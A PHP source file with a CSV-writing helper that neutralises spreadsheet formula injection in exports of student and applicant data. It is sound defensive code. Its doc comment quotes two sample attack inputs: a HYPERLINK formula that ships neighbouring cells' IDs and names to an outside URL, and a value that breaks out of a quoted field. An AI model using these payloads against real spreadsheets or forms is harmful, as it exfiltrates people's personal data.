<?php

declare(strict_types=1);

namespace App\Support;

/**
 * Every CSV this application writes goes through here.
 *
 * The files are opened in a spreadsheet by staff — that is what the UTF-8 BOM
 * on each export is for — and a spreadsheet runs any cell that starts with
 * `=`, `+`, `-` or `@` as a formula. Names and titles come from people who are
 * not staff: an applicant registering on the public PMB portal, a lecturer
 * describing an activity. `=HYPERLINK("https://…?"&A2&B2;"Lihat")` as a name
 * is a link that ships its neighbours' NIM and name to a stranger.
 *
 * Two things, then:
 *
 *   - a text cell that would start a formula is prefixed with an apostrophe,
 *     which spreadsheets show as text and do not display. Numbers, including
 *     negative amounts and numeric strings, are left exactly as they are.
 *   - the escape character is off (RFC 4180 quoting only). With PHP's default
 *     backslash escape, `x\",=FORMULA()` ends the field early and the formula
 *     lands in a cell of its own, where the first-character check never sees
 *     it.
 */
final class Csv
{
    private const PEMICU = ['=', '+', '-', '@', "\t", "\r"];

    /** @param  resource  $keluaran */
    public static function tulis($keluaran, array $baris, string $pemisah = ','): void
    {
        fputcsv($keluaran, array_map(self::sel(...), $baris), $pemisah, '"', '');
    }

    public static function sel(mixed $nilai): mixed
    {
        if (!is_string($nilai) || $nilai === '' || is_numeric($nilai)) {
            return $nilai;
        }

        return in_array($nilai[0], self::PEMICU, true) ? "'".$nilai : $nilai;
    }
}
